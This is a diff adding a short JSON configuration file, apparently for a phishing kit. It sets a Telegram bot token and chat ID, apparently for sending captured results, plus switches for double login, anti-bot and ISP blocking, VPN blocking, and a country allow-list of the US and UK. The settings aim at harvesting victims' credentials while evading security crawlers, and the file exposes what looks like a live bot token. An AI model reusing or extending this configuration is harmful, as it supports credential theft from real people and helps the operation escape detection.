@@ -1,0 +1,14 @@
+{
+    "Token":"581393597:AAHdS8Ygvi9FX5CkYELjNwo14-4b9O8hks",
+    "Chat_Id":"196832961",
+
+    "Get_Result_Document":"off",
+    "Viewer_Information":"on",
+    "Vpn_Block":"off",
+    "Bot_ISP_Block":"on",
+    "Country_Block":"on",
+    "Double_Login":"on",
+    "Antibot_Block_Result":"on",
+
+    "Country_Allow":"['US','UK']"
+}
